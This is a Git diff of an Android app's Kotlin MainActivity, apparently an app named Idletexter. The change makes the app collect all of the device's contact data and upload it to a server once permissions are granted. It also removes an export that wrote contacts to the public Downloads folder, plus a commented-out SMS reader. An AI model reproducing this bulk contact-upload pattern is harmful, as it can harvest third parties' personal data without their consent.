@@ -45,12 +45,6 @@ import java.lang.Exception
 import java.io.*
 import kotlin.collections.HashSet
 
-//import org.apache.poi.xssf.usermodel.XSSFSheet
-
-//import org.apache.poi.xssf.usermodel.XSSFWorkbook
-
-
-
 
 
 class MainActivity : AppCompatActivity() {
@@ -81,128 +75,14 @@ class MainActivity : AppCompatActivity() {
 
         val isPermitted = ManagePermissions(this,list,permissionsRequestCode).checkPermissions()
         if (isPermitted){
-            val contactList = Formatter().getContactLogs(this)
+            val contactList = Formatter().getAllContactData(this)
+
             val idletexterData = IdletexterData(contactList)
+            retrofitCallsAuthentication.uploadContacts(this,idletexterData)
 
-//            createExcel(idletexterData)
-
-            retrofitCallsAuthentication.uploadContacts(this,idletexterData )
-
-//            Formatter().getAllSms(this)
         }
 
     }
-
-    private fun createExcel(idletexterData: IdletexterData) {
-
-
-        savePublicly(idletexterData.contactList)
-
-//        val csv =
-//            Environment.getExternalStorageDirectory().absolutePath + "/MyCsvFile.csv" // Here csv file name is MyCsvFile.csv
-
-//        val workbook: XSSFWorkbook = XSSFWorkbook()
-//
-//        //Create a blank sheet
-//
-//        //Create a blank sheet
-//        val sheet = workbook.createSheet("Employee Data")
-//
-//        //This data needs to be written (Object[])
-//
-//        //This data needs to be written (Object[])
-//        val data: MutableMap<String, Array<Any>> = TreeMap()
-//        data["1"] = arrayOf("ID", "NAME", "LASTNAME")
-//        data["2"] = arrayOf(1, "Amit", "Shukla")
-//        data["3"] = arrayOf(2, "Lokesh", "Gupta")
-//        data["4"] = arrayOf(3, "John", "Adwards")
-//        data["5"] = arrayOf(4, "Brian", "Schultz")
-//
-//        //Iterate over data and write to sheet
-//
-//        //Iterate over data and write to sheet
-//        val keyset: Set<String> = data.keys
-//        var rownum = 0
-//        for (key in keyset) {
-//            val row = sheet.createRow(rownum++)
-//            val objArr = data[key]!!
-//            var cellnum = 0
-//            for (obj in objArr) {
-//                val cell = row.createCell(cellnum++)
-//                if (obj is String) cell.setCellValue(obj as String) else if (obj is Int) cell.setCellValue(
-//                    obj as Int
-//                )
-//            }
-//        }
-//        try {
-//            //Write the workbook in file system
-//            val out = FileOutputStream(File("howtodoinjava_demo.xlsx"))
-//            workbook.write(out)
-//            out.close()
-//            println("howtodoinjava_demo.xlsx written successfully on disk.")
-//        } catch (e: Exception) {
-//            e.printStackTrace()
-//        }
-
-
-//
-//        var writer: CSVWriter? = null
-//        try {
-//            writer = CSVWriter(FileWriter(csv))
-//            val data: MutableList<Array<String>> = ArrayList()
-////            data.add(arrayOf("Country", "Capital"))
-////            data.add(arrayOf("India", "New Delhi"))
-////            data.add(arrayOf("United States", "Washington D.C"))
-////            data.add(arrayOf("Germany", "Berlin"))
-//            val idletexterList = idletexterData.contactList
-//            for (contacts in idletexterList){
-//                data.add(arrayOf(contacts))
-//            }
-//
-//            writer.writeAll(data) // data is adding to csv
-//            writer.close()
-////            callRead()
-//        } catch (e: IOException) {
-//            e.printStackTrace()
-//        }
-
-
-    }
-
-
-    fun savePublicly(idletexterData: HashSet<String>) {
-
-        val xmlFile = File(
-            Environment
-                .getExternalStoragePublicDirectory(Environment.DIRECTORY_DOWNLOADS)
-                .toString() + "/contacts2.txt"
-        )
-
-        writeTextData(xmlFile, idletexterData)
-    }
-    private fun writeTextData(file: File, idletexterData: HashSet<String>) {
-        var fileOutputStream: FileOutputStream? = null
-        try {
-            fileOutputStream = FileOutputStream(file)
-
-            for (str in idletexterData) {
-                fileOutputStream.write((str + System.lineSeparator()).toByteArray())
-            }
-//            fileOutputStream.write("data".toByteArray())
-            Toast.makeText(this, "Done" + file.absolutePath, Toast.LENGTH_SHORT).show()
-        } catch (e: Exception) {
-            e.printStackTrace()
-        } finally {
-            if (fileOutputStream != null) {
-                try {
-                    fileOutputStream.close()
-                } catch (e: IOException) {
-                    e.printStackTrace()
-                }
-            }
-        }
-    }
-
 
     @RequiresApi(Build.VERSION_CODES.O)
     override fun onStart() {
@@ -212,8 +92,6 @@ class MainActivity : AppCompatActivity() {
 
     @RequiresApi(Build.VERSION_CODES.O)
     private fun checkUserPermission() {
-
-
 
         // Initialize a new instance of ManagePermissions class
         val isPermitted = ManagePermissions(this,list,permissionsRequestCode).checkPermissions()
